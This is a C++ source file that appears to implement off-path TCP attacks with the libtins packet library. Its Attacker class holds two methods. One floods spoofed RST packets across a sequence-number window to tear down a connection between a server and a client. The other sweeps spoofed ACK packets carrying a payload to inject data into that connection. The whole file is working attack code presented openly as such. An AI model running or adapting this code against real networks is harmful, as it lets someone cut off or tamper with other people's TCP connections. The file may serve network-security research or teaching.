#include "Attacker.h"
#include <iostream>
#include <tins/tins.h>

using namespace Tins;

void Attacker::TCP_dos() {
    PacketSender sender;
    for (int i = -seq_in_window; i < seq_window_size; ++i) {
        uint32_t seq = seq_in_window + i;

        IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port);
        TCP &tcp = packet.rfind_pdu<TCP>();
        tcp.set_flag(TCP::RST, true);
        tcp.seq(seq);

        sender.send(packet, send_if_name);
    }
    std::cout << "^.^.^ Reset TCP connection ^.^.^" << std::endl;
}


void Attacker::TCP_inject() {
    PacketSender sender;
    std::string payload = " The attacker's payload ";
    
    for (int i = 0; i < 1; ++i) {
        for(int j=0; j<65535; ++j){
            int64_t seq_t = seq_in_window + i;
            int64_t ack_t = ack_in_window + j*ack_window_size;
            uint32_t seq = static_cast<uint32_t>(seq_t);
            uint32_t ack = static_cast<uint32_t>(ack_t);


            IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port) / RawPDU(payload);
            TCP &tcp = packet.rfind_pdu<TCP>();
            tcp.set_flag(TCP::ACK, true);
            tcp.seq(seq);
            tcp.ack_seq(ack);

            sender.send(packet, send_if_name);
        }
    }
    std::cout << "^.^.^ Inject data into TCP connection ^.^.^" << std::endl;
}
